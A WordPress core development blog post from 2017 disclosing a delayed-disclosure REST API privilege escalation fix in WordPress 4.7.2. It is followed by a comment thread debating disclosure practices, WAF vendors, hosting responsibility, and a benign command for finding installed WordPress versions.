  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Make WordPress Core](https://make.wordpress.org/core)

* [Tickets](https://make.wordpress.org/core/reports/)
* [Components](https://make.wordpress.org/core/components/)
* [Handbook](https://make.wordpress.org/core/handbook/)
* [Browse Source](https://core.trac.wordpress.org/browser)
* [Trac Timeline](https://core.trac.wordpress.org/timeline)
* [Create a New Ticket](https://login.wordpress.org/?redirect_to=https://core.trac.wordpress.org/newticket)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fmake.wordpress.org%2Fcore%2F2017%2F02%2F01%2Fdisclosure-of-additional-security-fix-in-wordpress-4-7-2&locale=en_US)

* [Tickets](https://make.wordpress.org/core/reports/)
* [Components](https://make.wordpress.org/core/components/)
* [Handbook](https://make.wordpress.org/core/handbook/)
* [Browse Source](https://core.trac.wordpress.org/browser)
* [Trac Timeline](https://core.trac.wordpress.org/timeline)
* [Create a New Ticket](https://login.wordpress.org/?redirect_to=https://core.trac.wordpress.org/newticket)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fmake.wordpress.org%2Fcore%2F2017%2F02%2F01%2Fdisclosure-of-additional-security-fix-in-wordpress-4-7-2&locale=en_US)

**Menu**
Hide welcome box

## Welcome!

The WordPress coreCore Core is the set of software required to run WordPress. The Core Development Team builds WordPress. development team builds WordPress! Follow this site for general updates, status reports, and the occasional code debate. There’s lots of ways to contribute:

* **Found a bugbug A bug is an error or unexpected result. Performance improvements, code optimization, and are considered enhancements, not defects. After feature freeze, only bugs are dealt with, with regressions (adverse changes from the previous version) being the highest priority.?** [Create a ticket](https://wordpress.org/support/bb-login.php?redirect_to=https://core.trac.wordpress.org/newticket) in the bug tracker.
* **Want to contribute?** Get started quickly with tickets marked as [good first bugs](https://core.trac.wordpress.org/tickets/good-first-bugs) for new contributors or join a [bug scrub](https://make.wordpress.org/core/handbook/testing/bug-gardening/). There’s more on the [reports page](https://make.wordpress.org/core/reports/), like [patches needing testing](https://core.trac.wordpress.org/tickets/needs-testing), and on [feature projects page](https://make.wordpress.org/core/features/).
* **Other questions?** Here is a detailed [handbook for contributors](https://make.wordpress.org/core/handbook/), complete with tutorials.

## Communication

Core uses [Slack](https://make.wordpress.org/chat/) for real-time communication. Contributors live all over the world, so there are discussions happening at all hours of the day.

Core development meetings are every Wednesday at [20:00 UTC](http://time.is/2000_in_UTC) in the [**#core**](https://wordpress.slack.com/messages/core/) channel on [Slack](https://make.wordpress.org/chat/). Anyone can join and participate or listen in!

##

[![](https://secure.gravatar.com/avatar/87f8c2bbfabbae3462bbab2c83ce82763c7ff91bc632b64f3af7e24d929633f6?s=48&d=mm&r=g)](https://profiles.wordpress.org/aaroncampbell/ "Posts by Aaron D. Campbell ( @aaroncampbell )")
[Aaron D. Campbell](https://profiles.wordpress.org/aaroncampbell/ "Posts by Aaron D. Campbell ( @aaroncampbell )")
3:59 pm *on* February 1, 2017

Tags: [4.7 ( 124 )](https://make.wordpress.org/core/tag/4-7/), [release ( 24 )](https://make.wordpress.org/core/tag/release/), [security ( 18 )](https://make.wordpress.org/core/tag/security/)

# Disclosure of Additional Security Fix in WordPress 4.7.2

[WordPress 4.7.2](https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/) was released last Thursday, January 26th. If you have not already updated, please do so immediately.

In addition to the three security vulnerabilities mentioned in the original release post, WordPress 4.7 and 4.7.1 had one additional vulnerability for which disclosure was delayed. There was an *Unauthenticated Privilege Escalation Vulnerability in a REST APIREST API The REST API is an acronym for the RESTful Application Program Interface (API) that uses HTTP requests to GET, PUT, POST and DELETE data. It is how the front end of an application (think “phone app” or “website”) can communicate with the data store (think “database” or “file system”) <https://developer.wordpress.org/rest-api/>. Endpoint*. Previous versions of WordPress, even with the REST API PluginPlugin A plugin is a piece of software containing a group of functions that can be added to a WordPress website. They can extend functionality or add new features to your WordPress websites. WordPress plugins are written in the PHP programming language and integrate seamlessly with WordPress. These can be free in the WordPress.org Plugin Directory https://wordpress.org/plugins/ or can be cost-based plugin from a third-party, were never vulnerable to this.

**We believe transparency is in the public’s best interest**. It is our stance that security issues should always be disclosed. In this case, we intentionally delayed disclosing this issue by one week to ensure the safety of millions of additional WordPress sites.

On January 20th, [Sucuri](https://sucuri.net/) alerted us to a vulnerability discovered by one of their security researchers, [Marc-Alexandre Montpas](https://twitter.com/MarcS0h). The security team began assessing the issue and working on solutions. While a first iteration of a fix was created early on, the team felt that more testing was needed.

Meanwhile, Sucuri added rules to their Web Application Firewall (WAF) to blockBlock Block is the abstract term used to describe units of markup that, composed together, form the content or layout of a webpage using the WordPress editor. The idea combines concepts of what in the past may have achieved with shortcodes, custom HTML, and embed discovery into a single consistent API and user experience. exploit attempts against their clients. This issue was found internally and no outside attempts were discovered by Sucuri.

Over the weekend, we reached out to several other companies with WAFs including SiteLock, Cloudflare, and Incapsula and worked with them to create a set of rules that could protect more users. By Monday, they had put rules in place and were regularly checking for exploit attempts in the wild.

On Monday, while we continued to test and refine the fix, our focus shifted to WordPress hosts. We contacted them privately with information on the vulnerability and ways to protect users. Hosts worked closely with the security team to implement protections and regularly checked for exploit attempts against their users.

By Wednesday afternoon, most of the hosts we worked with had protections in place. Data from all four WAFs and WordPress hosts showed *no indication that the vulnerability had been exploited in the wild*. As a result, we made the decision to delay disclosure of this particular issue to give time for automatic updates to run and ensure as many users as possible were protected before the issue was made public.

On Thursday, January 26, we [released WordPress 4.7.2 to the world](https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/). The release went out over our autoupdate system and, over a couple of hours, millions of WordPress 4.7.x users were protected without knowing about the issue or taking any action at all.

We’d like to thank Sucuri for their [responsible disclosure](https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html), as well as working with us to delay disclosure until we were confident that as many WordPress sites were updated to 4.7.2 as possible. We’d also like to thank the WAFs and hosts who worked closely with us to add additional protections and monitored their systems for attempts to use this exploit in the wild. As of today, to our knowledge, there have been no attempts to exploit this vulnerability in the wild.

[#4-7](https://make.wordpress.org/core/tag/4-7/), [#release](https://make.wordpress.org/core/tag/release/), [#security](https://make.wordpress.org/core/tag/security/)

### Share this:

* [Click to share on Threads (Opens in new window)](https://make.wordpress.org/core/2017/02/01/disclosure-of-additional-security-fix-in-wordpress-4-7-2/?share=threads "Click to share on Threads")
* [Click to share on Mastodon (Opens in new window)](https://make.wordpress.org/core/2017/02/01/disclosure-of-additional-security-fix-in-wordpress-4-7-2/?share=mastodon "Click to share on Mastodon")
* [Click to share on Bluesky (Opens in new window)](https://make.wordpress.org/core/2017/02/01/disclosure-of-additional-security-fix-in-wordpress-4-7-2/?share=bluesky "Click to share on Bluesky")
* [Click to share on X (Opens in new window)](https://make.wordpress.org/core/2017/02/01/disclosure-of-additional-security-fix-in-wordpress-4-7-2/?share=x "Click to share on X")
* [Click to share on Facebook (Opens in new window)](https://make.wordpress.org/core/2017/02/01/disclosure-of-additional-security-fix-in-wordpress-4-7-2/?share=facebook "Click to share on Facebook")
* [Click to share on LinkedIn (Opens in new window)](https://make.wordpress.org/core/2017/02/01/disclosure-of-additional-security-fix-in-wordpress-4-7-2/?share=linkedin "Click to share on LinkedIn")

1. ![](https://secure.gravatar.com/avatar/bf9745c7ed75307b1560f35d0962401f4644698c983504dd7401bf0c9e61ced0?s=32&d=mm&r=g)
   [White Fir Design](https://profiles.wordpress.org/whitefirdesign/)
   5:38 pm *on* February 1, 2017

   From everything we have seen what is promoted as SiteLock’s WAF is really Incapsula’s WAF. Did you confirm that SiteLock in fact has their own WAF before providing non-public information on this to them?

   * ![](https://secure.gravatar.com/avatar/87f8c2bbfabbae3462bbab2c83ce82763c7ff91bc632b64f3af7e24d929633f6?s=32&d=mm&r=g)
     [Aaron D. Campbell](https://profiles.wordpress.org/aaroncampbell/)
     5:52 pm *on* February 1, 2017

     Honestly I’m not sure it matters if it’s Incapsula’s WAF that SiteLock runs additional rules on top of, or something completely their own (and yes, my understanding is that it’s the former). They acted responsibly, both now and in the past, and were able to assist us with securing WordPress sites quickly and effectively.

     + ![](https://secure.gravatar.com/avatar/bf9745c7ed75307b1560f35d0962401f4644698c983504dd7401bf0c9e61ced0?s=32&d=mm&r=g)
       [White Fir Design](https://profiles.wordpress.org/whitefirdesign/)
       6:15 pm *on* February 1, 2017

       It does matter if you are providing non-public information to a company that doesn’t need it, which would be the case here if Incapsula could have (and may in fact have) provided protection against this without involving SiteLock.

       It is worth noting here that you work for a company, GoDaddy, that has a business relationship with SiteLock (one that isn’t fully disclosed by either one of the companies to their customers) and one that [we have found has lead to WordPress websites continuing to be insecure when they shouldn’t have been in the first place](https://www.whitefirdesign.com/blog/2016/09/14/godaddy-and-sitelock-make-a-mess-of-a-hack-cleanup-and-drop-the-ball-on-security-as-well/).

       Based on your reply, it sounds like it would be best to have someone making decisions involving SiteLock that doesn’t have the conflictconflict A conflict occurs when a patch changes code that was modified after the patch was created. These patches are considered *stale*, and will require a *refresh* of the changes before it can be applied, or the conflicts will need to be *resolved*. of interest you have.

       - ![](https://secure.gravatar.com/avatar/323cf209e19dd825678e9ccc51bc3f745f96571f1c68af26ae7955c1fa9ad1f2?s=32&d=mm&r=g)
         [Aaron Jorbin](https://profiles.wordpress.org/jorbin/)
         9:50 pm *on* February 1, 2017

         The decision on what external parties to notify and when to do so is made by the WordPress Security Team. All individuals on the security team are there due to their individual knowledge and do not represent the organizations that pay them. They are expected to act in the best interest of all WordPress users, not the best interest of their employer.

         * ![](https://secure.gravatar.com/avatar/bf9745c7ed75307b1560f35d0962401f4644698c983504dd7401bf0c9e61ced0?s=32&d=mm&r=g)
           [White Fir Design](https://profiles.wordpress.org/whitefirdesign/)
           10:53 pm *on* February 1, 2017

           Our experience with Mr. Campbell is that he cares a lot about security, as last year he fixed [a vulnerability in one of his plugins that we discovered was likely being exploited, within a day](https://www.pluginvulnerabilities.com/2016/08/16/arbitrary-file-upload-vulnerability-in-attachment-manager/), despite the pluginPlugin A plugin is a piece of software containing a group of functions that can be added to a WordPress website. They can extend functionality or add new features to your WordPress websites. WordPress plugins are written in the PHP programming language and integrate seamlessly with WordPress. These can be free in the WordPress.org Plugin Directory https://wordpress.org/plugins/ or can be cost-based plugin from a third-party not having been updated within the last 7 years before that.

           But none of what you mentioned removes the conflictconflict A conflict occurs when a patch changes code that was modified after the patch was created. These patches are considered *stale*, and will require a *refresh* of the changes before it can be applied, or the conflicts will need to be *resolved*. of interest that exists here, seeing as Mr. Campbell is the Team Lead of the WordPress Security Team. The issue seems rather important as a company that appears to not need to have access to sensitive non-public information is being given access to it and [then is using their access to promote themselves (where they even gave a shoutout to Mr. Campbell)](https://wpdistrict.sitelock.com/blog/wordpress-rest-api-vulnerability/). Making it worse, this is a company that is [known to spread false information about the security of WordPress](https://www.whitefirdesign.com/blog/2016/09/06/sitelock-spreading-false-information-about-wordpress-security-to-their-customers-through-their-platform-scan-for-wordpress/) (to say nothing of the rest of their well earned poor reputation as a security company).

           This certainly isn’t the biggest issue when it comes to the handling of security surrounding WordPress, the [now years long refusal to warn people about their use of vulnerable plugins](https://www.pluginvulnerabilities.com/2016/08/16/wordpress-keeping-the-public-in-the-dark-about-plugins-they-know-are-vulnerable/) (including ones that we have notified WordPress about that are already being exploited) is as baffling as it is troubling, but it is still concerning that this conflict of interest hasn’t been appropriately dealt with already and you didn’t actually determine what role, if any, SiteLock plays with their WAF before providing them with non-public information.

           + ![](https://secure.gravatar.com/avatar/9c0affc8ad4a25431f48a8563264a089650f6332b868bd0e7c999f72741967ed?s=32&d=mm&r=g)
             [chriscct7](https://profiles.wordpress.org/chriscct7/)
             11:59 pm *on* February 1, 2017

             There were a lot of individuals on the team involved with the decision, not just Aaron, including myself and others who are not members of SiteLock or any hosting provider, or any parent or subsidiary of those companies. If you’re seeking confirmation/rejection of a theory you have (based on your website) about SiteLock and their WAF, you should talk to them.

             - ![](https://secure.gravatar.com/avatar/bf9745c7ed75307b1560f35d0962401f4644698c983504dd7401bf0c9e61ced0?s=32&d=mm&r=g)
               [White Fir Design](https://profiles.wordpress.org/whitefirdesign/)
               9:29 pm *on* February 3, 2017

               Considering that SiteLock makes claims about their WAF that are plainly not true, us talking them isn’t likely going to get them to admit they have been lying about it. But that isn’t even the issue here, nor is our interest in confirming a theory.

               The issue here is that you are providing sensitive non-public information to a company without even knowing if they need access to it and the available evidence indicating they don’t. The issue shouldn’t be hard to grasp and yet it looks like the security team isn’t up to the task of doing that, which is unfortunate.
3. ![](https://secure.gravatar.com/avatar/b380cba5f082d04479993f7e6b15b45df62e387e76c666c0b859f739d9f981a9?s=32&d=mm&r=g)
   [JulesR](https://profiles.wordpress.org/julesr/)
   5:44 pm *on* February 1, 2017

   You mentioned you’ve reached out to hosts to help them set up protection against this kind of attack, but what about other (smaller) hosts? Are there any protection(s) we can implement to help protect our users? Perhaps a mod\_security rule, for example?

   * ![](https://secure.gravatar.com/avatar/87f8c2bbfabbae3462bbab2c83ce82763c7ff91bc632b64f3af7e24d929633f6?s=32&d=mm&r=g)
     [Aaron D. Campbell](https://profiles.wordpress.org/aaroncampbell/)
     5:53 pm *on* February 1, 2017

     Please feel free to message me on the WordPress SlackSlack Slack is a Collaborative Group Chat Platform <https://slack.com/>. The WordPress community has its own Slack Channel at <https://make.wordpress.org/chat/>. ([@aaroncampbell](https://profiles.wordpress.org/aaroncampbell/)) and I’ll try to assist you.

     + ![](https://secure.gravatar.com/avatar/b380cba5f082d04479993f7e6b15b45df62e387e76c666c0b859f739d9f981a9?s=32&d=mm&r=g)
       [JulesR](https://profiles.wordpress.org/julesr/)
       1:24 am *on* February 2, 2017

       Is there a reason why I’d need to go through such steps to get assistance? In the interests of full public disclosure (as I imagine is the purpose of this blogblog (versus network, site) post), is there not simply some information you can publicly provide to me (and others reading this blog post) that will advise on what steps we can take to protect our customers?

       Are there no mod\_security rules we could utilise, for example? Apologies for the somewhat defensive nature to my response, but I really don’t want to have to jump through hoops and contact you via a third party method. This seems more like an attempt to upsell a security product rather than actually seeking to provide the readers of this blog post with useful information they can use to protect their users. Yes, we can upgrade installations, but what steps can we take in the meantime?

       - ![](https://secure.gravatar.com/avatar/fadfacd681ccc41ba05b7dc39fe8c4b3e73da4bc80ca5ef04b7fba96d5e731ca?s=32&d=mm&r=g)
         [timbutlerau](https://profiles.wordpress.org/timbutlerau/)
         3:11 am *on* February 2, 2017

         It’s only just in it’s infancy, but there is a dedicated slackSlack Slack is a Collaborative Group Chat Platform <https://slack.com/>. The WordPress community has its own Slack Channel at <https://make.wordpress.org/chat/>. channel for the WordPress hosting community, as well as a start of a dedicated area with information for hosting providers: <https://make.wordpress.org/hosting/>

         You will find other hosting companies (big and small) on Slack discussing similar issues, so well worth the time to join.
       - ![](https://secure.gravatar.com/avatar/87f8c2bbfabbae3462bbab2c83ce82763c7ff91bc632b64f3af7e24d929633f6?s=32&d=mm&r=g)
         [Aaron D. Campbell](https://profiles.wordpress.org/aaroncampbell/)
         3:14 am *on* February 2, 2017

         Upgrading sites immediately is by far the best approach (next to having already upgraded them after the security release a week ago).

         My offer to help was not an attempt to hide things, but simply that: an offer to help. I don’t have any rules that hosts are running directly, and most of them seem to have their own methods for dealing with these kind of issues. The majority appear to be blocking at the networknetwork (versus site, blog) layer using some kind of Intrusion Prevention System like Cisco or Tipping Point. Some seemed to use some kind of nGinxNGINX NGINX is open source software for web serving, reverse proxying, caching, load balancing, media streaming, and more. It started out as a web server designed for maximum performance and stability. In addition to its HTTP server capabilities, NGINX can also function as a proxy server for email (IMAP, POP3, and SMTP) and a reverse proxy and load balancer for HTTP, TCP, and UDP servers. <https://www.nginx.com/>./LUA layer.

         We do have some modsecurity rules that we wrote during testing, but I don’t know if they were ever fully tested and I know for a fact that they require JSONJSON JSON, or JavaScript Object Notation, is a minimal, readable format for structuring data. It is used primarily to transmit data between a server and web application, as an alternative to XML. support be compiled in. Since they’re not fully tested I’d rather not post there here as though they’re a recommended fix.
       - ![](https://secure.gravatar.com/avatar/55a8514294f7d145b32acfcd18db1ab34862f78c52c5d8dac8eec7c5b48b8d34?s=32&d=mm&r=g)
         [Tech01](https://profiles.wordpress.org/htdnet/)
         4:15 am *on* February 2, 2017

         Agree, upgrading your instances of WordPress is the best course of action. There are many other security measures that are free to use at no cost to you or your end-users. There are others that cost a reasonable fee to maintain (not meaning significant $$$) If you have not already placed sufficient protections in place, I would suggest that as a start. There are many resources and tools available as well as many many websites and folks ready to help, that can guide you in hardening your WordPress instances. Above all, keep your software up-to-date, you can do this by linking it to WordPress.comWordPress.com An online implementation of WordPress code that lets you immediately access a new WordPress environment to publish your content. WordPress.com is a private company owned by Automattic that hosts the largest multisite in the world. This is arguably the best place to start blogging if you have never touched WordPress before. <https://wordpress.com/> at least for your plugins etc. In the event that you cannot upgrade a site due to compatibility issues with a certain pluginPlugin A plugin is a piece of software containing a group of functions that can be added to a WordPress website. They can extend functionality or add new features to your WordPress websites. WordPress plugins are written in the PHP programming language and integrate seamlessly with WordPress. These can be free in the WordPress.org Plugin Directory https://wordpress.org/plugins/ or can be cost-based plugin from a third-party or service etc. Apparently having CloudFlare in place may prevent this exploit on your WordPress instances

         > Over the weekend, we reached out to several other companies with WAFs including SiteLock, Cloudflare, and Incapsula and worked with them to create a set of rules that could protect more users. By Monday, they had put rules in place and were regularly checking for exploit attempts in the wild.

         [CloudFlare has FREE Plans Available](https://www.cloudflare.com/plans/) though I would highly recommend for sites requiring extra security go ahead and bump it up a level or two. They even offer re-seller opportunities

         .

         [Here is the official doc on auto-updates](https://codex.wordpress.org/Configuring_Automatic_Background_Updates)

         * ![](https://secure.gravatar.com/avatar/b380cba5f082d04479993f7e6b15b45df62e387e76c666c0b859f739d9f981a9?s=32&d=mm&r=g)
           [JulesR](https://profiles.wordpress.org/julesr/)
           2:43 pm *on* February 2, 2017

           While I agree with the sentiment, we are a hosting provider. It is ultimately our clients responsibility to update their own installations, which (as you would know if you worked in the industry), is not a common occurrence at all. Many installations are just installed and then left as is for the remainder of their use. Sometimes the simplest solution (just update the software) is not always feasible. With that said, I don’t think it’s unreasonable to ask for mitigation methods for the rest of us “smaller folk” that we can use. With respect, this article seemed more about promoting third party security services than actually telling the rest of us how to mitigate said attacks. And again, it’s not always as simple as just “update your software”.

           + ![](https://secure.gravatar.com/avatar/13b698440e2a7da3a50cbedc2c16be513c6f8e1f8b11278d783548dd269cee38?s=32&d=mm&r=g)
             [Zach Stepek](https://profiles.wordpress.org/zstepek/)
             4:31 pm *on* February 2, 2017

             By leaving the choice to update 100% on your clients, you are abdicating the responsibility you should be taking for the security of your client’s sites and data. No installation should ever be “just installed and then left as is for the remainder of their use.” This mentality is the problem. It is your job to educate your customers as to why updating is important so that they do so and to gradually phase out support for older versions of WordPress so that they have to.

             - ![](https://secure.gravatar.com/avatar/b380cba5f082d04479993f7e6b15b45df62e387e76c666c0b859f739d9f981a9?s=32&d=mm&r=g)
               [JulesR](https://profiles.wordpress.org/julesr/)
               4:55 pm *on* February 2, 2017

               Your comment is utterly ridiculous and very clearly demonstrates that you have no knowledge or real-world experience as a hosting provider. Indeed, looking at your profile you are a consultant and not a hosting provider.

               It’s very easy to sit back and suggest that hosts should educate their customers on the dangers of not updating their software, but this is the kind of ignorant wishful thinking that has no basis in reality. The actual reality is that when you have hundreds or even thousands of customers running WordPress, not all of them care about security – even if you regularly advise them to keep things up to date. Some may not even have the technical knowledge to constantly update their software, or perhaps they don’t have the time to manage their installations. Honestly, the reasons for them not updating their installations are completely irrelevant. How you can then claim that this becomes the hosts responsibility is hilariously misguided. That’s not what a hosting provider is or does, and I know of no hosting provider on the planet that will take any scripts that I install and monitor them to the point of telling me that if they are out of date, I need to update or they will disable them entirely. Do you think customers will take kindly to being told to update their scripts or to lose access to their websites? Do you think that makes good business sense from the providers perspective? Again, your wishful thinking is so very far from the reality of the situation that your comments are beyond ridiculous.

               Instead, what any reputable hosting provider should do is realise that in the real world they will have scripts that are out of date on their servers. They will know that despite sending out warnings to their customers, not all will update. What to do in such a situation? Well the best we can do is to implement any reasonable methods to protect those customers, be it mod\_security rules to protect against known attack vectors, or other implementations. That is the very least any provider should do. Taking on what is effectively the management and maintenance of their customers software is not something they should ever get involved with – and this is precisely why they don’t.

               Ultimately, if a site gets compromised because it is out of date, that’s the site owners responsibility. We would be remiss if we didn’t at least try to implement any available methods to protect them against attacks if we are able to. That is a hosting providers duty and responsibility, not maintaining their websites for them.

               * ![](https://secure.gravatar.com/avatar/ae4a4e54f58de7f040c1caef738bb56f5ccaf16b0eed9b2304df92826609d3ca?s=32&d=mm&r=g)
                 [Mike Schroder](https://profiles.wordpress.org/kirasong/)
                 10:54 pm *on* February 2, 2017

                 While I agree that it’s very important to have protection in WAFs (and I applaud this!), I wanted to be sure I fact checked your comments about host upgrades of installs.

                 Many hosts automatically upgrade WP installs, (especially those installed by our systems) and some do indeed scan and monitor exact versions and either notify or automatically upgrade. This is becoming more and more common, and is starting to be expected functionality for WordPress-centric hosts.
               * ![](https://secure.gravatar.com/avatar/13b698440e2a7da3a50cbedc2c16be513c6f8e1f8b11278d783548dd269cee38?s=32&d=mm&r=g)
                 [Zach Stepek](https://profiles.wordpress.org/zstepek/)
                 9:00 pm *on* February 3, 2017

                 While I agree that it is ultimately the client’s responsibility to update their site, to completely absolve yourself of any responsibility in this matter is reckless. Also, I’m not “just a consultant.” Our agency runs some of the largest WooCommerce sites in the world and has extensive experience with hosting, developing for and managing sites running both WordPress and WooCommerce. I’ve also been in the industry for two decades in various roles, including as the Director of Product Development at… a video streaming *hosting* company.
             - ![](https://secure.gravatar.com/avatar/6976d95f130d89278f63169e5aa65a640260eca1401f38e6ad1554d7c6d50496?s=32&d=mm&r=g)
               [damien\_vancouver](https://profiles.wordpress.org/damien_vancouver/)
               6:25 pm *on* February 3, 2017

               “Many hosts automatically upgrade WP installs” ? “some scan and monitor” ? “this is becoming more common”? Anecdotal evidence much?

               Plenty of WP sites don’t auto update. Fact. I don’t know if you run a hosting company or are just talking crap with your “Fact checking” but I do and it is my direct experience that only about 3/4 of wordpress installs happily auto update. The others get stuck, for whatever reason.

               None of these is an excuse for withholding information on purpose. In the time spent trying to lure people to SlackSlack Slack is a Collaborative Group Chat Platform <https://slack.com/>. The WordPress community has its own Slack Channel at <https://make.wordpress.org/chat/>. for a sales pitch or avoid providing specifics by redirecting blame onto hosting providers, it would have been easy to just post the actual information everyone is asking for here. Totally weak.

               * ![](https://secure.gravatar.com/avatar/ae4a4e54f58de7f040c1caef738bb56f5ccaf16b0eed9b2304df92826609d3ca?s=32&d=mm&r=g)
                 [Mike Schroder](https://profiles.wordpress.org/kirasong/)
                 8:43 pm *on* February 3, 2017

                 I work at a hosting company and regularly communicate with other hosting companies about WordPress and their practices surrounding it.
5. ![](https://secure.gravatar.com/avatar/f38676be97b8d7ee8c454d9c32aff580948400109f6ca16262ecb498ee1f81ef?s=32&d=mm&r=g)
   [Maeve Lander](https://profiles.wordpress.org/enigmaweb/)
   8:54 am *on* February 2, 2017

   Well done and thank you Security Team. Sounds like this was handled exceptionally well. A shout out to the autoupdate system too – perfect use-case.
7. ![](https://secure.gravatar.com/avatar/1b867b42575266b0f0f61827cb49c3516f1088d9a03400500a61eb0b92948eb5?s=32&d=mm&r=g)
   [idearius](https://profiles.wordpress.org/idearius/)
   3:22 pm *on* February 2, 2017

   There’s no mention to any communication with Wordfence, that has a WAF included in their free and paid versions and, as per <https://wordpress.org/plugins/wordfence/>, has 1+ million active installs, making it the most popular security pluginPlugin A plugin is a piece of software containing a group of functions that can be added to a WordPress website. They can extend functionality or add new features to your WordPress websites. WordPress plugins are written in the PHP programming language and integrate seamlessly with WordPress. These can be free in the WordPress.org Plugin Directory https://wordpress.org/plugins/ or can be cost-based plugin from a third-party out there. Can you confirm that?

   * ![](https://secure.gravatar.com/avatar/85cd797876de53531b77ed37565fcf9fd5a7bae47d5139120cec9f63d17b706b?s=32&d=mm&r=g)
     [Luke Cavanagh](https://profiles.wordpress.org/lukecavanagh/)
     5:59 pm *on* February 15, 2017

     If you where using CloudFlare, even on the free plan you would have been protected.

     <https://blog.cloudflare.com/protecting-everyone-from-wordpress-content-injection/>

     + ![](https://secure.gravatar.com/avatar/f847340cac151352b0bc321c16df9a032472b24bd496730d22dbecdaa1dbeec8?s=32&d=mm&r=g)
       [FolioVision](https://profiles.wordpress.org/foliovision/)
       7:54 pm *on* February 15, 2017

       > If you where using CloudFlare, even on the free plan you would have been protected.

       So we have to use a paid service which is trying to privatise the internet to be able to safely use our open sourceOpen Source Open Source denotes software for which the original source code is made freely available and may be redistributed and modified. Open Source \*\*must be\*\* delivered via a licensing model, see GPL. software which is democratising publishing.

       Am I the only one who sees a contradiction here?

       > A shout out to the autoupdate system too – perfect use-case.

       On top of that we have to allow an opaque organisation WordPress.orgWordPress.org The community site where WordPress code is created and shared by the users. This is where you can download the source code for WordPress core, plugins and themes as well as the central location for community conversations and organization. <https://wordpress.org/>) unrestricted access to our servers if we want (late) protection.

       ### Prevention

       Perhaps we should [not be pushing instant adoption of beta versions](https://wordpress.org/plugins/businesspress/)? Perhaps we should be adding a preference for enabling non-essential features (emojis, XML-RPC, oembed, REST apiREST API The REST API is an acronym for the RESTful Application Program Interface (API) that uses HTTP requests to GET, PUT, POST and DELETE data. It is how the front end of an application (think “phone app” or “website”) can communicate with the data store (think “database” or “file system”) <https://developer.wordpress.org/rest-api/>.) so that WordPress doesn’t present a single profile to hackers. Perhaps we should be baking good security practices into WordPress rather than outsourcing it to complex and unreliable plugins?
     + ![](https://secure.gravatar.com/avatar/1b867b42575266b0f0f61827cb49c3516f1088d9a03400500a61eb0b92948eb5?s=32&d=mm&r=g)
       [idearius](https://profiles.wordpress.org/idearius/)
       11:40 pm *on* February 15, 2017

       Thanks, Luke, but that doesn’t answer the question.

       If in deed there were no contacts with the Wordfence team, more than a million WordPress users were left unprotected unnecessarily. It puzzles me why.
9. ![](https://secure.gravatar.com/avatar/96611b4745a5f7638a295338a9c10013b1b1d54d4caae169e51cad7f32347129?s=32&d=mm&r=g)
   [Angelika Reisiger](https://profiles.wordpress.org/la-geek/)
   4:45 pm *on* February 2, 2017

   With the greatest respect, I think, you always reactReact React is a JavaScript library that makes it easy to reason about, construct, and maintain stateless and stateful user interfaces. <https://reactjs.org/>. very fast and on a high security level to vulnerabilities.

   But in this particular case your practice earned a lot of criticism, e. g. from a big german online magazin (Heise.de) [in this article](https://www.heise.de/security/meldung/WordPress-4-7-2-Entwickler-verschweigen-kritische-Sicherheitsluecke-3616398.html).

   They wrote among others that in future WordPress Users can’t trust the appraisal of the communicated priority level and that WordPress users from now on should update always immediately (okay this is finally a positive effect).

   But Heise.de also wrote, that the appraisal of News Magazins and the BSI (the german Federal Agency for Security) was a lower security risk, see [here (level 3 – 2017-01-27)](https://www.cert-bund.de/advisoryshort/CB-K17-0154) and [today (level 5 – 2017-02-02)](https://www.cert-bund.de/advisoryshort/CB-K17-0154%20UPDATE%201). So WordPress Users did not realize the importance of the update.

   Others (in comments) prefer the way, Joomla! had chosen, Joomla! Devs [announced](https://www.joomla.org/announcements/release-news/5677-important-security-announcement-pre-release-364.html) a high priority issue one week before release to ensure, that as most users as possible will be aware of the importance of the next update.

   In this case (Joomla!) hackers had 1 week to find a security issue with no further informations.

   With WordPress 4.7.2 hackers could merge the small update packages with 4.7.1 and had one week to figure out, which code fixed which issues and probably also could find the code, that fixed the API issue.

   I am not able to appraise your practice and I don’t know how hackers work, but I wanted to mention the criticism (small shitstorm for now) in the www.
11. ![](https://secure.gravatar.com/avatar/cbc299cbcd83b39c973dff4eb4ab35f4f6eb252f8b335e43c5e536f4d99e2f8d?s=32&d=mm&r=g)
    [woodsb02](https://profiles.wordpress.org/woodsb02/)
    10:45 pm *on* February 2, 2017

    Can you please tell me what the CVE number is for this additional vulnerability?
13. ![](https://secure.gravatar.com/avatar/033397e69dba8dce72dcda6282a730c93e67bf3b255044da7d2ba72073ff76ce?s=32&d=mm&r=g)
    [nonwpuser](https://profiles.wordpress.org/nonwpuser/)
    5:47 pm *on* February 3, 2017

    As root user, is there a command I can run on server to check what version(s) my users are running ? i.e. grep – is there a file that contains the version string or it in each database only?

    * ![](https://secure.gravatar.com/avatar/87f8c2bbfabbae3462bbab2c83ce82763c7ff91bc632b64f3af7e24d929633f6?s=32&d=mm&r=g)
      [Aaron D. Campbell](https://profiles.wordpress.org/aaroncampbell/)
      6:07 pm *on* February 3, 2017

      The file is `wp-includes/version.php` and you can get the version like this:

      ```
      find . -path "*wp-includes/version.php" | xargs grep "\$wp_version ="
      ```

      If you want cleaner versions with less context, try

      ```
      find . -path "*wp-includes/version.php" | xargs grep -o "\$wp_version = '\([^']*\)" | cut -d "'" -f2
      ```
15. ![](https://secure.gravatar.com/avatar/6976d95f130d89278f63169e5aa65a640260eca1401f38e6ad1554d7c6d50496?s=32&d=mm&r=g)
    [damien\_vancouver](https://profiles.wordpress.org/damien_vancouver/)
    12:40 am *on* February 4, 2017

    SlackSlack Slack is a Collaborative Group Chat Platform <https://slack.com/>. The WordPress community has its own Slack Channel at <https://make.wordpress.org/chat/>. invites, deliberate withholding of information hackers already have, and even worse appearing to rub people’s nose in it in a self congratulatory post about how you shared the info with certain commercial vendors and then STILL not giving up the info…… is not helpful or responsible disclosure.

